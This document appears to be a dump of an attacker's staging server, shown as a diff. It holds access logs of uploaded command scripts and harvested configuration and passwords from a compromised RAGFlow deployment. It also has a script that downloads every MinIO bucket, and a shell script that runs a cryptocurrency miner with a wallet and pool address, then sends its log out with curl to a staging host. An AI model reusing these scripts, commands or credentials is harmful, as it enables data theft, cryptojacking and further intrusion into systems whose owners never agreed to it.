@@ -1,0 +1,350 @@
+20.169.120.182### GV8 2026-11-25T00:49:00Z
+===== http://123.184.7.135:8099/hits.log
+.0.0.1 POST /put/cmd.sh 837
+123.184.7.135 POST /put/cmd.sh 228
+123.184.7.135 POST /put/seq 15
+123.184.7.135 POST /put/cmd.sh 2580
+123.184.7.135 POST /put/seq 18
+123.184.7.135 POST /put/cmd.sh 2580
+123.184.7.135 POST /put/seq 18
+123.184.7.135 POST /put/cmd.sh 2580
+123.184.7.135 POST /put/seq 18
+123.184.7.135 POST /put/cmd.sh 1332
+123.184.7.135 POST /put/seq 18
+123.184.7.135 POST /put/cmd.sh 1332
+123.184.7.135 POST /put/seq 18
+123.184.7.135 POST /put/cmd.sh 2100
+123.184.7.135 POST /put/seq 18
+123.184.7.135 POST /put/cmd.sh 2100
+123.184.7.135 POST /put/seq 18
+123.184.7.135 POST /put/cmd.sh 1372
+123.184.7.135 POST /put/seq 18
+123.184.7.135 POST /put/cmd.sh 1372
+123.184.7.135 POST /put/seq 18
+123.184.7.135 POST /put/cmd.sh 1372
+123.184.7.135 POST /put/seq 18
+153.56.230.3 POST /put/cmd.sh 1309
+153.56.230.3 POST /put/seq 10
+123.184.7.135 POST /put/cmd.sh 412
+123.184.7.135 POST /put/seq 18
+153.56.230.3 POST /put/cmd.sh 1309
+153.56.230.3 POST /put/seq 10
+123.184.7.135 POST /put/cmd.sh 412
+123.184.7.135 POST /put/seq 18
+153.56.230.3 POST /put/cmd.sh 1008
+153.56.230.3 POST /put/seq 10
+123.184.7.135 POST /put/cmd.sh 1672
+123.184.7.135 POST /put/seq 18
+153.56.230.3 POST /put/cmd2.sh 4084
+153.56.230.3 POST /put/seq2 10
+123.184.7.135 POST /put/cmd.sh 1672
+123.184.7.135 POST /put/seq 18
+153.56.230.3 POST /put/cmd2.sh 1111
+153.56.230.3 POST /put/seq2 10
+153.56.230.3 POST /put/cmd.sh 599
+153.56.230.3 POST /put/seq 10
+153.56.230.3 POST /put/cmd.sh 1114
+153.56.230.3 POST /put/seq 10
+153.56.230.3 POST /put/cmd.sh 4173
+153.56.230.3 POST /put/seq 10
+153.56.230.3 POST /put/cmd.sh 1209
+153.56.230.3 POST /put/seq 10
+153.56.230.3 POST /put/cmd.sh 2100
+153.56.230.3 POST /put/seq 10
+153.56.230.3 POST /put/cmd.sh 806
+153.56.230.3 POST /put/seq 10
+123.184.7.135 POST /put/cmd.sh 468
+123.184.7.135 POST /put/seq 18
+123.184.7.135 POST /put/cmd.sh 1920
+123.184.7.135 POST /put/seq 18
+153.56.230.3 POST /put/cmd.sh 533
+153.56.230.3 POST /put/seq 4
+153.56.230.3 POST /put/cmd.sh 855
+153.56.230.3 POST /put/seq 4
+153.56.230.3 POST /put/cmd.sh 1055
+153.56.230.3 POST /put/seq 4
+153.56.230.3 POST /put/cmd.sh 875
+153.56.230.3 POST /put/seq 4
+153.56.230.3 POST /put/cmd.sh 597
+153.56.230.3 POST /put/seq 4
+153.56.230.3 POST /put/cmd.sh 854
+153.56.230.3 POST /put/seq 4
+153.56.230.3 POST /put/cmd.sh 1538
+153.56.230.3 POST /put/seq 4
+153.56.230.3 POST /put/cmd.sh 1075
+153.56.230.3 POST /put/seq 4
+153.56.230.3 POST /put/cmd.sh 1807
+153.56.230.3 POST /put/seq 4
+153.56.230.3 POST /put/cmd.sh 1210
+153.56.230.3 POST /put/seq 4
+153.56.230.3 POST /put/cmd.sh 1004
+153.56.230.3 POST /put/seq 4
+153.56.230.3 POST /put/cmd.sh 3166
+153.56.230.3 POST /put/seq 4
+153.56.230.3 POST /put/cmd.sh 2216
+153.56.230.3 POST /put/seq 4
+153.56.230.3 POST /put/cmd.sh 798
+153.56.230.3 POST /put/seq 4
+153.56.230.3 POST /put/cmd.sh 86
+153.56.230.3 POST /put/seq 7
+153.56.230.3 POST /put/i6877probe.txt 10
+153.56.230.3 POST /put/cmd.sh 667
+153.56.230.3 POST /put/seq 7
+153.56.230.3 POST /put/cmd.sh 1002
+153.56.230.3 POST /put/seq 7
+
+===== http://123.184.7.135:8099/access.log
+GET /run.sh HTTP/1.1" 200 -
+127.0.0.1 "GET /seq HTTP/1.1" 200 -
+127.0.0.1 "GET /run.sh HTTP/1.1" 200 -
+127.0.0.1 "GET /seq HTTP/1.1" 200 -
+127.0.0.1 "GET /run.sh HTTP/1.1" 200 -
+127.0.0.1 "GET /seq HTTP/1.1" 200 -
+127.0.0.1 "GET /run.sh HTTP/1.1" 200 -
+127.0.0.1 "GET /seq HTTP/1.1" 200 -
+127.0.0.1 "GET /run.sh HTTP/1.1" 200 -
+127.0.0.1 "GET /seq HTTP/1.1" 200 -
+127.0.0.1 "GET /run.sh HTTP/1.1" 200 -
+127.0.0.1 "GET /seq HTTP/1.1" 200 -
+127.0.0.1 "GET /run.sh HTTP/1.1" 200 -
+127.0.0.1 "GET /seq HTTP/1.1" 200 -
+127.0.0.1 "GET /run.sh HTTP/1.1" 200 -
+127.0.0.1 "GET /seq HTTP/1.1" 200 -
+20.171.32.200 "GET / HTTP/1.1" 200 -
+20.171.32.200 code 400, message Bad request syntax ('\x16\x03\x01\x06')
+20.171.32.200 "" 400 -
+127.0.0.1 "GET /run.sh HTTP/1.1" 200 -
+127.0.0.1 "GET /seq HTTP/1.1" 200 -
+127.0.0.1 "GET /run.sh HTTP/1.1" 200 -
+127.0.0.1 "GET /seq HTTP/1.1" 200 -
+20.171.32.200 code 400, message Bad request syntax ('\x16\x03\x01\x06')
+20.171.32.200 "" 400 -
+20.171.32.200 code 404, message File not found
+20.171.32.200 "GET /api/kernels HTTP/1.1" 404 -
+20.171.32.200 code 400, message Bad request syntax ('\x16\x03\x01\x06')
+20.171.32.200 "" 400 -
+20.171.32.200 code 404, message File not found
+20.171.32.200 "GET /api/status HTTP/1.1" 404 -
+20.171.32.200 code 400, message Bad request syntax ('\x16\x03\x01\x06')
+20.171.32.200 "" 400 -
+20.171.32.200 code 404, message File not found
+20.171.32.200 "GET /lab HTTP/1.1" 404 -
+20.171.32.200 code 400, message Bad request syntax ('\x16\x03\x01\x06')
+20.171.32.200 "" 400 -
+20.171.32.200 code 404, message File not found
+20.171.32.200 "GET /tree HTTP/1.1" 404 -
+20.171.32.200 code 400, message Bad request syntax ('\x16\x03\x01\x06')
+20.171.32.200 "" 400 -
+20.171.32.200 code 404, message File not found
+20.171.32.200 "GET /api/contents/ HTTP/1.1" 404 -
+20.171.32.200 code 400, message Bad request syntax ('\x16\x03\x01\x06')
+20.171.32.200 "" 400 -
+20.171.32.200 code 404, message File not found
+20.171.32.200 "GET /jupyter/api/kernels HTTP/1.1" 404 -
+127.0.0.1 "GET /run.sh HTTP/1.1" 200 -
+127.0.0.1 "GET /seq HTTP/1.1" 200 -
+127.0.0.1 "GET /run.sh HTTP/1.1" 200 -
+127.0.0.1 "GET /seq HTTP/1.1" 200 -
+127.0.0.1 "GET /run.sh HTTP/1.1" 200 -
+127.0.0.1 "GET /seq HTTP/1.1" 200 -
+172.178.118.245 "GET / HTTP/1.1" 200 -
+127.0.0.1 "GET /run.sh HTTP/1.1" 200 -
+127.0.0.1 "GET /seq HTTP/1.1" 200 -
+127.0.0.1 "GET /run.sh HTTP/1.1" 200 -
+127.0.0.1 "GET /seq HTTP/1.1" 200 -
+127.0.0.1 "GET /run.sh HTTP/1.1" 200 -
+127.0.0.1 "GET /seq HTTP/1.1" 200 -
+127.0.0.1 "GET /run.sh HTTP/1.1" 200 -
+127.0.0.1 "GET /seq HTTP/1.1" 200 -
+127.0.0.1 "GET /run.sh HTTP/1.1" 200 -
+127.0.0.1 "GET /seq HTTP/1.1" 200 -
+172.184.209.149 "GET /.plh/ HTTP/1.1" 200 -
+172.184.209.149 "GET /boot.txt HTTP/1.1" 200 -
+172.184.209.149 "GET /.seq HTTP/1.1" 200 -
+172.184.209.149 "GET /cmd.sh HTTP/1.1" 200 -
+172.184.209.149 "GET /cmd1.sh HTTP/1.1" 200 -
+172.184.209.149 "GET /cmd2.sh HTTP/1.1" 200 -
+172.184.209.149 "GET /c16.sh HTTP/1.1" 200 -
+172.184.209.149 "GET /c17.sh HTTP/1.1" 200 -
+172.184.209.149 "GET /c18.sh HTTP/1.1" 200 -
+172.184.209.149 "GET /c19.sh HTTP/1.1" 200 -
+127.0.0.1 "GET /run.sh HTTP/1.1" 200 -
+127.0.0.1 "GET /seq HTTP/1.1" 200 -
+172.184.209.149 "GET /c20.sh HTTP/1.1" 200 -
+172.184.209.149 "GET /c21.sh HTTP/1.1" 200 -
+172.184.209.149 "GET /d3.txt HTTP/1.1" 200 -
+172.184.209.149 "GET /d4.txt HTTP/1.1" 200 -
+172.184.209.149 "GET /access.log HTTP/1.1" 200 -
+172.184.209.149 "GET /hits.log HTTP/1.1" 200 -
+172.184.209.149 "GET /diag6421.txt HTTP/1.1" 200 -
+172.184.209.149 "GET /i6821_creds.txt HTTP/1.1" 200 -
+127.0.0.1 "GET /run.sh HTTP/1.1" 200 -
+127.0.0.1 "GET /seq HTTP/1.1" 200 -
+127.0.0.1 "GET /run.sh HTTP/1.1" 200 -
+127.0.0.1 "GET /seq HTTP/1.1" 200 -
+127.0.0.1 "GET /run.sh HTTP/1.1" 200 -
+127.0.0.1 "GET /seq HTTP/1.1" 200 -
+127.0.0.1 "GET /run.sh HTTP/1.1" 200 -
+127.0.0.1 "GET /seq HTTP/1.1" 200 -
+127.0.0.1 "GET /run.sh HTTP/1.1" 200 -
+127.0.0.1 "GET /seq HTTP/1.1" 200 -
+20.169.120.182 "GET /hits.log HTTP/1.1" 200 -
+
+===== http://123.184.7.135:8099/.seq
+6877301
+
+### POST-UP-TEST
+post-up 200 2
+ok
+get-back 404 469
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
+        "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+    <head>
+        <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
+        <title>Error response</title>
+    </head>
+    <body>
+        <h1>Error response</h1>
+        <p>Error code: 404</p>
+        <p>Message: File not found.</p>
+        <p>Error code explanation: HTTPStatus.NOT_FOUND - Nothing matches the given URI.</p>
+    </body>
+</html>
+
+### POST-OTHER-PATHS
+POST /up/ -> 200
+ok
+POST /upload -> 200
+ok
+POST /api/up -> 200
+ok
+POST /cmd -> 200
+ok
+POST /run -> 200
+ok
+POST /put -> 200
+ok
+### C2-HINTS
+===== http://123.184.7.135:8099/i6821_cfg.txt
+UTABLE=/root/uv_tools/.venv/bin/mineru
+MYSQL_PASSWORD=<redacted-in-report>
+TEI_IMAGE_CPU=infiniflow/text-embeddings-inference:cpu-1.8
+OB_DATAFILE_SIZE=20G
+RAGFLOW_IMAGE=infiniflow/ragflow:latest
+SVR_WEB_HTTPS_PORT=18443
+MINERU_BACKEND=pipeline
+OB_SYS_PASSWORD=<redacted-in-report>
+MYSQL_MAX_PACKET=1073741824
+ES_HOST=npa-es
+OB_MEMORY_LIMIT=10G
+SVR_WEB_HTTP_PORT=18080
+COMPOSE_PROJECT_NAME=npa
+ELASTIC_PASSWORD=<redacted-in-report>
+STACK_VERSION=8.11.3
+INFINITY_HTTP_PORT=23820
+MINIO_USER=rag_flow
+REDIS_HOST=rag-redis
+OB_CLUSTER_NAME=ragflow
+OS_HOST=opensearch01
+OCEANBASE_PASSWORD=<redacted-in-report>
+OB_SYSTEM_MEMORY=2G
+MYSQL_DBNAME=rag_flow
+DEVICE=cpu
+MYSQL_HOST=rag-mysql
+--- mounts
+/ssd/vendors/QD_ZRYY/ow_customer/ragflow/docker/nginx/nginx.conf -> /etc/nginx/nginx.conf
+/ssd/vendors/QD_ZRYY/ow_customer/ragflow/docker/nginx/proxy.conf -> /etc/nginx/proxy.conf
+/ssd/vendors/QD_ZRYY/ow_customer/ragflow/history_data -> /ragflow/history_data_agent
+/ssd/vendors/QD_ZRYY/ow_customer/ragflow/logs -> /ragflow/logs
+/ssd/vendors/QD_ZRYY/ow_customer/ragflow/rag/llm/chat_model.py -> /ragflow/rag/llm/chat_model.py
+/ssd/vendors/QD_ZRYY/ow_customer/ragflow/docker/nginx/ragflow.conf -> /etc/nginx/conf.d/ragflow.conf
+/ssd/vendors/QD_ZRYY/ow_customer/ragflow/docker/service_conf.yaml.template -> /ragflow/conf/service_conf.yaml.template
+/ssd/vendors/QD_ZRYY/ow_customer/ragflow/docker/entrypoint.sh -> /ragflow/entrypoint.sh
+/ssd/vendors/QD_ZRYY/ow_customer/ragflow/rag/prompts/generator.py -> /ragflow/rag/prompts/generator.py
+
+--- rag-mysql env
+TZ=Asia/Shanghai
+MYSQL_ROOT_PASSWORD=infini_rag_flow
+MYSQL_DATABASE=rag_flow
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+GOSU_VERSION=1.19
+MYSQL_MAJOR=8.0
+MYSQL_VERSION=8.0.46-1.el9
+MYSQL_SHELL_VERSION=8.0.46-1.el9
+
+--- rag-minio env
+MINIO_ROOT_USER=rag_flow
+MINIO_ROOT_PASSWORD=infini_rag_flow
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+MINIO_ACCESS_KEY_FILE=access_key
+MINIO_SECRET_KEY_FILE=secret_key
+MINIO_ROOT_USER_FILE=access_key
+MINIO_ROOT_PASSWORD_FILE=secret_key
+MINIO_KMS_SECRET_KEY_FILE=kms_master_key
+MINIO_UPDATE_MINISIGN_PUBKEY=RWTx5Zr1tiHQLwG9keckT0c45M3AGeHD6IvimQHpyRywVWGbP1aVSGav
+MINIO_CONFIG_ENV_FILE=config.env
+MC_CONFIG_DIR=/tmp/.mc
+
+--- npa-minio env
+TZ=Asia/Shanghai
+MINIO_ROOT_USER=minioadmin
+MINIO_ROOT_PASSWORD=minioadmin
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+MINIO_ACCESS_KEY_FILE=access_key
+MINIO_SECRET_KEY_FILE=secret_key
+MINIO_ROOT_USER_FILE=access_key
+MINIO_ROOT_PASSWORD_FILE=secret_key
+MINIO_KMS_SECRET_KEY_FILE=kms_master_key
+MINIO_UPDATE_MINISIGN_PUBKEY=RWTx5Zr1tiHQLwG9keckT0c45M3AGeHD6IvimQHpyRywVWGbP1aVSGav
+MINIO_CONFIG_ENV_FILE=config.env
+MC_CONFIG_DIR=/tmp/.mc
+
+--- rag-redis env
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+GOSU_VERSION=1.17
+REDIS_VERSION=7.4.8
+REDIS_DOWNLOAD_URL=http://download.redis.io/releases/redis-7.4.8.tar.gz
+REDIS_DOWNLOAD_SHA=f6773cb7d63be236c59c2917a82f1f08e47b77d89b2f0c9f53becb22b8ea4172
+
+
+===== http://123.184.7.135:8099/i6821_dump.py
+import os
+from minio import Minio
+c = Minio('rag-minio:9000', access_key='rag_flow', secret_key='infini_rag_flow', secure=False)
+root='/ragflow/logs/i6821dump'
+n=0; total=0
+with open('/ragflow/logs/i6821_manifest.txt','w') as mf:
+    for b in c.list_buckets():
+        for o in c.list_objects(b.name, recursive=True):
+            p=os.path.join(root, b.name, o.object_name)
+            os.makedirs(os.path.dirname(p), exist_ok=True)
+            try:
+                c.fget_object(b.name, o.object_name, p)
+                n+=1; total+=o.size
+                mf.write(f"{b.name}\t{o.object_name}\t{o.size}\tOK\n")
+            except Exception as e:
+                mf.write(f"{b.name}\t{o.object_name}\t{o.size}\tERR {str(e)[:80]}\n")
+print("DONE files=%d bytes=%d"%(n,total))
+
+===== http://123.184.7.135:8099/diag17.sh
+#!/bin/bash
+{
+echo "HOST=$(hostname) $(date)"
+echo "== LS"; ls -la /opt/t19/log/ 2>/dev/null | head -12
+echo "== U0"; cat /opt/t19/log/u0.log 2>/dev/null | head -20
+echo "== U1"; cat /opt/t19/log/u1.log 2>/dev/null | head -10
+echo "== FILE"; file /opt/t19/wildrig-multi; ldd /opt/t19/wildrig-multi 2>&1 | head -12
+echo "== NVSMI"; which nvidia-smi; nvidia-smi -L 2>&1 | wc -l
+echo "== RUN"
+cd /opt/t19
+W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
+timeout 15 ./wildrig-multi --algo pearlhash --url prl-sg.kryptex.network:7048 --user $W.ul-t19-93863-192-168-0-17-g0 --pass x --opencl-devices 0 --gpu-intensity 1 --api-port 1910 > /tmp/wr0.log 2>&1
+echo "rc=$?"
+echo "== WR0"; head -40 /tmp/wr0.log
+echo "== PROCS"; pgrep -fa wildrig | head -5
+echo "== UNIT"; systemctl is-active t19-pearl; systemctl status t19-pearl --no-pager 2>/dev/null | tail -6
+} > /tmp/diag17.log 2>&1
+curl -s -m 10 -X POST --data-binary @/tmp/diag17.log http://192.168.0.23:8099/up/diag17
+
+### DONE8
